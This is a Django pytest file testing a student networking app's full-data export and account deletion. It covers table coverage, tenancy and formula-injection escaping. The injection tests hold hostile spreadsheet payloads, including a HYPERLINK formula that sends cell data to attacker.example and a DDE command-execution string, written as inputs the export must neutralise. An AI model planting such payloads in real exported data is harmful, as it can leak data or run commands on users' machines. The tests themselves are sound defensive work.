"""Tests for the data export (docs/specs/settings-page.md audit #2).

The defect these exist to prevent: the privacy policy promised "export
everything as CSV at any time" and Settings said "download all your data",
while `/welcome/export/` served two files — contacts and touches. Target firms
and tiers, tracked applications and their interview dates, tasks, chat
debriefs, capture events, fit scores, imports, usage events, and the profile
row itself were all unreachable. The contacts file additionally dropped
`linkedin`, `school`, `school_affiliation` and `archived`, and that last one
made the export actively wrong rather than merely thin: the founder has 25
archived contacts out of 137, and a round-trip through the old file
resurrected every one of them as an active person back in the cadence queue.

The load-bearing test here is `test_every_deletable_table_is_also_exportable`.
The export and the delete path are the two halves of "your data is yours": one
list of tables must not be allowed to grow without the other. Asserting the
containment mechanically is what stops the next table from repeating this.
"""

from __future__ import annotations

import csv
import io
import zipfile
from datetime import date, timedelta

import pytest
from django.contrib.auth import get_user_model
from django.urls import reverse
from django.utils import timezone

from accounts import services
from accounts.models import PushSubscription
from analytics.models import FitScore, Import, ProductEvent, UserOpportunity
from assistant.models import (
    AdvisorMemory, ChatConversation, ChatFolder, ChatMessage, DailyBrief,
)
from billing.models import CreditLedger
from capture.models import GmailConnection
from crm.models import (
    BenchDismissal, CalendarEvent, ChatDebrief, Contact, ContactMerge, Task,
    Touch, UserFirm,
)
from directory.models import Firm, Opportunity

User = get_user_model()

pytestmark = pytest.mark.django_db


@pytest.fixture
def student():
    return User.objects.create_user(
        email="exporter@example.com",
        password="x",
        name="Ex Porter",
        school="Test University",
        class_year=2028,
        regions=["hk", "us"],
        tracks=["ib"],
        work_authorization={"hk": "citizen"},
        study_level="undergrad",
        languages=["english", "mandarin"],
        affiliations=["Rowed in college"],
        assets={"advocate_target": 3},
        cadence_params={"followup_after_business_days": 4},
        weekly_touch_goal=12,
        timezone="Asia/Hong_Kong",
    )


@pytest.fixture
def firm():
    return Firm.objects.create(name="Test Bank", slug="test-bank", regions=["hk"])


@pytest.fixture
def loaded(student, firm):
    """One row in every private table the user can own, so no builder is
    exercised only against an empty queryset."""
    live = Contact.all_objects.create(
        user=student, name="Live Person", firm=firm, email="live@test-bank.com",
        linkedin="https://linkedin.com/in/live", role="Analyst",
        school="Test University", school_affiliation=True, angle="Same crew team",
        notes="Responsive", archived=False,
    )
    archived = Contact.all_objects.create(
        user=student, name="Archived Person", firm=firm,
        email="archived@test-bank.com", archived=True,
    )
    ContactMerge.all_objects.create(
        user=student, primary=live, duplicate=archived,
        status=ContactMerge.STATUS_MERGED,
        evidence="Same mailbox name at related addresses.",
        moved_touch_ids=[1, 2], field_changes={"role": {"before": "", "after": "Analyst"}},
        note_line="Also reachable at archived@test-bank.com",
        duplicate_was_archived=False, resolved_at=timezone.now(),
    )
    touch = Touch.all_objects.create(
        user=student, contact=live, ts=timezone.now(), channel="email",
        kind="outreach", note="First note", source="manual",
    )
    UserFirm.all_objects.create(user=student, firm=firm, tier=1, status="target")
    opp = Opportunity.objects.create(
        firm=firm, title="2028 Summer Analyst", region="hk",
        deadline=date.today() + timedelta(days=30),
        url="https://test-bank.com/apply/1",
    )
    UserOpportunity.all_objects.create(
        user=student, opportunity=opp, applied_status="applied",
        applied_at=timezone.now(), interview_dates=["2026-09-01"],
    )
    Task.all_objects.create(
        user=student, title="Send thank-you", why="Chatted Tuesday",
        due=date.today(), kind="followup", firm=firm, status="open",
    )
    ChatDebrief.all_objects.create(
        user=student, contact=live, touch=touch,
        learned="Team is hiring two analysts", advocate_answer="yes",
    )
    FitScore.all_objects.create(
        user=student, subject_type="contact", subject_id=live.id,
        composite=0.72, axes={"network": 0.5}, reasoning="Strong overlap",
        computed_at=timezone.now(),
    )
    Import.all_objects.create(
        user=student, kind="contacts", filename="mine.csv", row_stats={"created": 2}
    )
    ProductEvent.all_objects.create(user=student, event="touch_logged", props={"source": "manual"})
    CalendarEvent.all_objects.create(
        user=student, title="Coffee with Live Person", starts_at=timezone.now(),
        kind="chat", source="manual", contact=live,
    )
    folder = ChatFolder.all_objects.create(user=student, name="BofA prep")
    conversation = ChatConversation.all_objects.create(
        user=student, title="Sizing up BofA", folder=folder,
    )
    ChatMessage.all_objects.create(
        user=student, conversation=conversation, role="user",
        content=[{"type": "text", "text": "How should I prep?"}],
    )
    AdvisorMemory.all_objects.create(user=student, text="Targeting HK over US")
    DailyBrief.all_objects.create(
        user=student, date=date.today(), text="Two firms are worth a follow-up today."
    )
    GmailConnection.all_objects.create(
        user=student, gmail_address="student@gmail.com",
        refresh_token_encrypted="ciphertext", status="active",
    )
    PushSubscription.all_objects.create(
        user=student, endpoint="https://fcm.googleapis.com/x", p256dh="key", auth="secret",
        user_agent="Mozilla/5.0 (test)",
    )
    CreditLedger.all_objects.create(
        user=student, delta=60, kind=CreditLedger.KIND_GRANT, period="2026-08",
    )
    BenchDismissal.all_objects.create(
        user=student, contact=live, opening_signature="deadline:2026-09-01",
    )
    return live


def _zip(user) -> zipfile.ZipFile:
    return zipfile.ZipFile(io.BytesIO(services.export_zip(user)))


def _rows(zf: zipfile.ZipFile, name: str) -> list[dict]:
    return list(csv.DictReader(io.StringIO(zf.read(name).decode())))


# ---------------------------------------------------------------------------
# The containment rule
# ---------------------------------------------------------------------------
def test_every_deletable_table_is_also_exportable(student, loaded):
    """Whatever deletion destroys, the export must first hand back.

    This is the guard that makes the promise durable rather than true-once:
    add a private table to `_DELETE_ORDER` without adding a CSV for it and
    this fails, naming the table.
    """
    exported = {name for name, _b, _d in services.EXPORT_FILES}
    # label -> the file that carries it. Deliberately explicit, so adding a
    # table forces a decision about where its rows show up rather than letting
    # a fuzzy name match paper over the gap.
    covered = {
        "contacts": "contacts.csv",
        "touches": "touches.csv",
        "user_firms": "firms.csv",
        "user_opportunities": "applications.csv",
        "tasks": "tasks.csv",
        "play_dismissals": "play_dismissals.csv",
        "bench_dismissals": "bench_dismissals.csv",
        "chat_debriefs": "chat_debriefs.csv",
        "campaigns": "campaigns.csv",
        "campaign_contacts": "campaign_contacts.csv",
        "contact_proposals": "contact_proposals.csv",
        "contact_merges": "contact_merges.csv",
        "application_events": "application_events.csv",
        "mail_facts": "mail_facts.csv",
        "autopilot_runs": "autopilot_runs.csv",
        "autopilot_decisions": "autopilot_decisions.csv",
        "fit_scores": "fit_scores.csv",
        "imports": "imports.csv",
        "product_events": "product_events.csv",
        "calendar_events": "calendar_events.csv",
        "chat_folders": "chat_folders.csv",
        "chat_conversations": "chat_conversations.csv",
        "chat_messages": "chat_messages.csv",
        "advisor_memories": "advisor_memories.csv",
        "daily_briefs": "daily_briefs.csv",
        "gmail_connection": "gmail_connection.csv",
        "gcal_connection": "gcal_connection.csv",
        "push_subscriptions": "push_subscriptions.csv",
        "credit_ledger": "credit_ledger.csv",
        "pro_waitlist": "pro_waitlist.csv",
    }
    for label, _model in services._DELETE_ORDER:
        assert label in covered, (
            f"`{label}` is deleted by delete_user_and_data but no export file "
            "claims it. Add a CSV builder, or the export's 'everything' is a lie."
        )
        assert covered[label] in exported


def test_every_private_model_is_covered_by_delete_order():
    """The completeness guard the test above assumes but never checked: that
    `_DELETE_ORDER` itself lists every `PrivateModel` subclass in the whole
    codebase, not just the ones some earlier author remembered to add.

    A model left off `_DELETE_ORDER` still gets swept — `delete_user_and_data`
    ends with `user.delete()`, and every private table's `user` FK is
    `on_delete=CASCADE` — but invisibly, the same bug `chat_debriefs` used to
    have (see the comment on `_DELETE_ORDER` above) and the same bug
    `capture_events` had in reverse (`test_delete_receipt.
    test_every_receipt_label_names_a_table_that_is_actually_deleted`). Left
    off `_DELETE_ORDER`, a model is also structurally unreachable through
    `test_every_deletable_table_is_also_exportable` above, since that test
    only ever walks `_DELETE_ORDER` — so a table can go missing from "export
    everything" for years with neither test able to notice, because both
    tests were only ever checking each other's list, never the actual set of
    private tables the codebase defines.
    """
    from django.apps import apps as django_apps

    from coverage_web.tenancy import PrivateModel

    private_models = {
        model
        for model in django_apps.get_models()
        if issubclass(model, PrivateModel) and not model._meta.abstract
    }
    covered_models = {model for _label, model in services._DELETE_ORDER}
    missing = private_models - covered_models
    assert not missing, (
        f"{sorted(m.__name__ for m in missing)} subclass PrivateModel but are "
        "missing from accounts.services._DELETE_ORDER. Their rows still get "
        "deleted (via the final user.delete() cascade — every PrivateModel's "
        "`user` FK is on_delete=CASCADE), but invisibly: the deletion receipt "
        "undercounts them, and they can never appear in the data export "
        "either, since that's built by walking this same list. Add each "
        "missing model to _DELETE_ORDER (in child-before-parent order) and a "
        "CSV builder to EXPORT_FILES."
    )


def test_the_zip_contains_every_declared_file_and_a_readme(student, loaded):
    zf = _zip(student)
    names = set(zf.namelist())
    assert "README.txt" in names
    for name, _builder, _desc in services.EXPORT_FILES:
        assert name in names


def test_the_page_lists_exactly_what_the_zip_holds(client, student, loaded):
    """The export page enumerates from EXPORT_FILES itself, so it cannot
    advertise a file the archive lacks — rule D4, "export copy enumerates"."""
    client.force_login(student)
    body = client.get(reverse("accounts:export")).content.decode()
    zipped = set(_zip(student).namelist()) - {"README.txt"}
    listed = {name for name, _desc in services.export_manifest()}
    assert listed == zipped
    for name in listed:
        assert name in body


def test_the_readme_names_what_is_left_out(student, loaded):
    """"Everything" is only honest when the exceptions are stated out loud."""
    readme = _zip(student).read("README.txt").decode()
    for exclusion in services.EXPORT_EXCLUSIONS:
        assert exclusion in readme


# ---------------------------------------------------------------------------
# Contacts: the columns that were missing
# ---------------------------------------------------------------------------
def test_archived_contacts_are_exported_and_flagged(student, loaded):
    """The bug with teeth. Archived rows were exported indistinguishably from
    live ones, so re-importing resurrected them into the cadence queue."""
    rows = {r["name"]: r for r in _rows(_zip(student), "contacts.csv")}
    assert set(rows) == {"Live Person", "Archived Person"}
    assert rows["Archived Person"]["archived"] == "True"
    assert rows["Live Person"]["archived"] == "False"


@pytest.mark.parametrize(
    "column,expected",
    [
        ("linkedin", "https://linkedin.com/in/live"),
        ("school", "Test University"),
        ("school_affiliation", "True"),
    ],
)
def test_the_previously_dropped_contact_columns_are_present(
    student, loaded, column, expected
):
    row = next(r for r in _rows(_zip(student), "contacts.csv") if r["name"] == "Live Person")
    assert row[column] == expected


# ---------------------------------------------------------------------------
# The tables that were missing entirely
# ---------------------------------------------------------------------------
def test_firms_carry_their_tier(student, loaded):
    rows = _rows(_zip(student), "firms.csv")
    assert rows == [{"firm": "Test Bank", "tier": "1", "status": "target"}]


def test_bench_dismissals_carry_the_contact_and_opening(student, loaded):
    """`bench_dismissals.csv` exists (see `test_every_deletable_table_is_also_exportable`)
    but that only proves the file is present, not that it carries anything
    real. This is the content check: the parked contact and the opening
    signature it was dismissed for."""
    row = _rows(_zip(student), "bench_dismissals.csv")[0]
    assert row["contact"] == "Live Person"
    assert row["opening"] == "deadline:2026-09-01"


def test_applications_carry_the_interview_dates(student, loaded):
    """Interview dates exist nowhere else — the student typed them in."""
    row = _rows(_zip(student), "applications.csv")[0]
    assert row["opportunity"] == "2028 Summer Analyst"
    assert row["firm"] == "Test Bank"
    assert "2026-09-01" in row["interview_dates"]


def test_debriefs_carry_what_the_chat_taught(student, loaded):
    row = _rows(_zip(student), "chat_debriefs.csv")[0]
    assert row["learned"] == "Team is hiring two analysts"
    assert row["advocate_answer"] == "yes"


def test_fit_scores_resolve_their_subject_to_a_name(student, loaded):
    """`subject_id` is a polymorphic integer; exporting it raw would hand the
    student a column of meaningless numbers."""
    row = _rows(_zip(student), "fit_scores.csv")[0]
    assert row["subject_type"] == "contact"
    assert row["subject"] == "Live Person"


def test_the_profile_row_is_exported_with_its_engine_settings(student, loaded):
    """Rewritten 2026-09-01 when `affiliations`, `languages` and
    `study_level` became real columns (accounts migration 0015): the row
    used to carry `angles` (an `assets` key) and `language` (the dead
    interface-language column). Both headings are asserted GONE, so the
    export cannot quietly keep exporting a key nothing writes any more."""
    row = _rows(_zip(student), "profile.csv")[0]
    assert row["email"] == "exporter@example.com"
    assert row["school"] == "Test University"
    assert "Rowed in college" in row["affiliations"]
    assert "mandarin" in row["languages"] and "english" in row["languages"]
    assert row["study_level"] == "undergrad"
    assert "angles" not in row, "renamed to affiliations, not duplicated"
    assert "language" not in row, "the dead column is gone, not exported blank"
    assert row["advocate_target"] == "3"
    assert "followup_after_business_days" in row["cadence_params"]
    assert row["weekly_touch_goal"] == "12"
    assert row["timezone"] == "Asia/Hong_Kong"
    assert '"hk": "citizen"' in row["work_authorization"].replace("'", '"')


def test_the_profile_export_never_carries_the_password(student, loaded):
    text = _zip(student).read("profile.csv").decode()
    assert student.password not in text
    assert "password" not in text.splitlines()[0]


# ---------------------------------------------------------------------------
# Tenancy — the export is a private-zone read
# ---------------------------------------------------------------------------
def test_the_export_contains_no_other_users_rows(student, loaded, firm):
    other = User.objects.create_user(email="other@example.com", password="x")
    Contact.all_objects.create(user=other, name="Someone Elses Contact", firm=firm)
    text = _zip(student).read("contacts.csv").decode()
    assert "Someone Elses Contact" not in text


# ---------------------------------------------------------------------------
# The view
# ---------------------------------------------------------------------------
def test_kind_all_serves_a_zip_attachment(client, student, loaded):
    client.force_login(student)
    resp = client.get(reverse("accounts:export") + "?kind=all")
    assert resp.status_code == 200
    assert resp["Content-Type"] == "application/zip"
    assert "coverage-data.zip" in resp["Content-Disposition"]
    assert zipfile.ZipFile(io.BytesIO(resp.content)).testzip() is None


def test_the_single_file_downloads_still_work(client, student, loaded):
    """Keeping them is the point — a student who wants contacts in a
    spreadsheet shouldn't have to unzip anything."""
    client.force_login(student)
    for kind, filename in (("contacts", "coverage-contacts.csv"),
                           ("touches", "coverage-touches.csv")):
        resp = client.get(reverse("accounts:export") + f"?kind={kind}")
        assert resp.status_code == 200
        assert filename in resp["Content-Disposition"]


def test_export_requires_a_login(client):
    resp = client.get(reverse("accounts:export") + "?kind=all")
    assert resp.status_code == 302


# ---------------------------------------------------------------------------
# CSV formula injection
#
# The export is the one place Coverage hands third-party-authored text to a
# program that executes text. A sender the student never chose picks their
# own Subject line; capture/gmail_live.py copies it into Touch.note; the
# student opens their export in Excel. Everything below exists to keep that
# last step boring.
#
# The escaping itself is `defusedcsv`'s (services.py `from defusedcsv import
# csv`) plus one supplementary guard for the one lead character it doesn't
# cover — see `_neutralise_tab_or_cr_lead`'s docstring. Formerly hand-rolled
# in full as `_safe_cell()`; see git log "Stop a stranger's email subject
# running as a formula in the export" for that version.
# ---------------------------------------------------------------------------
@pytest.mark.parametrize(
    "hostile",
    [
        "=SUM(1+1)",
        '=HYPERLINK("http://attacker.example/?x="&A1,"Click")',
        '=cmd|\' /C calc\'!A0',
        "+1+1",
        "-2+3",
        "@SUM(1+1)",
        "\t=SUM(1+1)",
        "\r=SUM(1+1)",
    ],
)
def test_a_formula_in_a_cell_exports_as_inert_text(hostile):
    text = services._csv(["note"], [[hostile]])
    cell = list(csv.reader(io.StringIO(text)))[1][0]
    # The apostrophe is only worth anything if it is genuinely first --
    # everything after it is inert to a spreadsheet's formula parser.
    assert cell[0] == "'"
    # defusedcsv (the library doing the escaping now — see services.py's
    # import comment) additionally backslash-escapes a literal `|`, a DDE
    # injection vector distinct from the leading-character one this test is
    # about. Undo just that before comparing: this test's job is confirming
    # the LEAD character lost its power, not defusedcsv's whole escaping
    # surface.
    assert cell[1:].replace("\\|", "|") == hostile


@pytest.mark.parametrize("lead", ["\t", "\r"])
def test_a_tab_or_cr_led_formula_is_still_neutralised(lead):
    """The one lead character defusedcsv's own writer does not escape
    (checked live against the installed version — `writer.writerow` leaves
    `"\\t=SUM(1+1)"` untouched). A spreadsheet strips a leading tab or
    carriage return on paste, before its own formula-detection runs, so this
    is not a theoretical gap. `_neutralise_tab_or_cr_lead` closes it ahead of
    defusedcsv rather than relying on the library to grow it."""
    hostile = f"{lead}=SUM(1+1)"
    text = services._csv(["note"], [[hostile]])
    cell = list(csv.reader(io.StringIO(text)))[1][0]
    assert cell == "'" + hostile
    assert cell[0] == "'"


@pytest.mark.parametrize("lead", ["|", "%"])
def test_defusedcsv_covers_two_lead_characters_the_old_guard_did_not(lead):
    """Not a regression check — a widening one. The hand-rolled guard this
    replaced only recognised `=+-@` (plus tab/CR); defusedcsv's own trigger
    set also catches a leading `|` (DDE) and `%` (some legacy Excel macro
    contexts), so swapping in the library is a strictly bigger net, not a
    like-for-like port."""
    hostile = f"{lead}SUM(1+1)"
    text = services._csv(["note"], [[hostile]])
    cell = list(csv.reader(io.StringIO(text)))[1][0]
    assert cell[0] == "'"


def test_a_hostile_subject_line_survives_the_real_touches_export(student, firm):
    """End to end, through the export a student actually downloads."""
    contact = Contact.all_objects.create(user=student, name="Recruiter", firm=firm)
    Touch.all_objects.create(
        user=student, contact=contact, ts=timezone.now(), channel="email",
        kind="reply", source="gmail",
        # Exactly the shape capture/gmail_live.py builds from a Subject header.
        note="=SUM(1+1)",
    )
    rows = _rows(_zip(student), "touches.csv")
    assert [r["note"] for r in rows] == ["'=SUM(1+1)"]


def test_a_negative_number_is_still_a_number():
    """Quoting every leading `-` would turn sortable numeric columns into
    text for no gain: a spreadsheet reads `-4` as the number -4, never as a
    formula."""
    text = services._csv(["a", "b", "c"], [[-4, "-4", "-12.5"]])
    assert list(csv.reader(io.StringIO(text)))[1] == ["-4", "-4", "-12.5"]


def test_a_phone_number_is_quoted_because_a_sheet_cannot_tell_it_from_a_formula():
    """`+1 415 555 0100` is not a number, and Excel will try to evaluate it.
    Quoting is what makes it display as typed."""
    text = services._csv(["phone"], [["+1 415 555 0100"]])
    assert list(csv.reader(io.StringIO(text)))[1] == ["'+1 415 555 0100"]


@pytest.mark.parametrize(
    "ordinary",
    ["Jane Banker", "jane@example.com", "Analyst, Markets", "", "Rowed in college"],
)
def test_ordinary_text_is_left_exactly_as_written(ordinary):
    text = services._csv(["note"], [[ordinary]])
    assert list(csv.reader(io.StringIO(text)))[1] == [ordinary]


def test_the_normal_export_is_unchanged_by_the_guard(student, loaded):
    """A full export of ordinary data carries no stray apostrophes — the
    guard is invisible until something actually looks like a formula."""
    zf = _zip(student)
    for name in zf.namelist():
        if not name.endswith(".csv"):
            continue
        for row in _rows(zf, name):
            for value in row.values():
                assert not (value or "").startswith("'")


# ---------------------------------------------------------------------------
# Deletion vs the PROTECT audit trail (capture.AutopilotDecision)
# ---------------------------------------------------------------------------
def test_deletion_survives_autopilot_and_mail_fact_rows(student, firm):
    """Regression for the emergent break between two same-day merges:
    `AutopilotDecision.proposal` / `.app_event` are `on_delete=PROTECT` (a
    decision is the audit trail for the row it judged), and
    `delete_user_and_data` deleted `contact_proposals` and
    `application_events` without sweeping the decisions first — so the first
    account deletion after a real Autopilot run raised ProtectedError and
    500'd. The decisions (and their runs, and mail facts) must be swept
    first, counted on the receipt, and reachable in the export."""
    from capture.models import (
        ApplicationEvent, AutopilotDecision, AutopilotRun, ContactProposal,
        MailFact,
    )
    from directory.models import Opportunity as DirOpportunity

    proposal = ContactProposal.all_objects.create(
        user=student, name="Judged Person", email="judged@test-bank.com",
        evidence="Replied to your email",
    )
    opp = DirOpportunity.objects.create(
        firm=firm, title="2028 IB Summer Analyst", region="hk",
        url="https://test-bank.com/apply/2",
    )
    event = ApplicationEvent.all_objects.create(
        user=student, opportunity=opp, firm=firm, firm_text="Test Bank",
        event_type=ApplicationEvent.APPLIED, target_status="submitted",
        evidence="Thank you for applying",
    )
    run = AutopilotRun.all_objects.create(user=student, model="test-model")
    AutopilotDecision.all_objects.create(
        user=student, run=run, proposal=proposal,
        decision=AutopilotDecision.DECIDE_ACCEPT, confidence=0.9,
        quote="Replied to your email",
    )
    AutopilotDecision.all_objects.create(
        user=student, run=run, app_event=event,
        decision=AutopilotDecision.DECIDE_ACCEPT, confidence=1.0,
        detected_by="deterministic",
    )
    MailFact.all_objects.create(
        user=student, kind=MailFact.KIND_DEPARTED,
        about_email="gone@test-bank.com", about_name="Gone Person",
        quote="Gone Person is no longer with the firm",
        status=MailFact.STATUS_APPLIED,
    )

    counts = services.delete_user_and_data(student)

    assert not User.objects.filter(email="exporter@example.com").exists()
    assert counts["autopilot_decisions"] == 2
    assert counts["autopilot_runs"] == 1
    assert counts["mail_facts"] == 1
    assert counts["contact_proposals"] == 1
    assert counts["application_events"] == 1


def test_deletion_counts_bench_dismissals(student, loaded):
    """`BenchDismissal` rows must show up in the deletion receipt's counts,
    not just get swept invisibly by the final `user.delete()` cascade — see
    `test_every_private_model_is_covered_by_delete_order`'s docstring for
    the bug this guards (the fixture's `loaded` state creates exactly one)."""
    counts = services.delete_user_and_data(student)
    assert counts["bench_dismissals"] == 1
